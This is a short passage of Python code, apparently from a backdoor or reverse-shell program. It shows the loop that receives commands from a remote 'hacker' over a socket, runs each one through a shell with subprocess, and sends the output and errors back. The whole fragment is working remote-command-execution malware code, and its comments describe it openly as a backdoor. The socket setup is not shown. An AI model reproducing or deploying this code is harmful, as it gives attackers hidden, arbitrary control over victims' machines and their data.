while True: # receiving commands and sending outputs repeated until program is closed
    command = backdoor.recv(1024)  # backdoor waiting for hacker to send the commands
    command = command.decode() # when receives command, decode the command
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read() # run command and read the output
    output_error = op.stderr.read() # read the error
    backdoor.send(output + output_error) # send output and error (if any) to hacker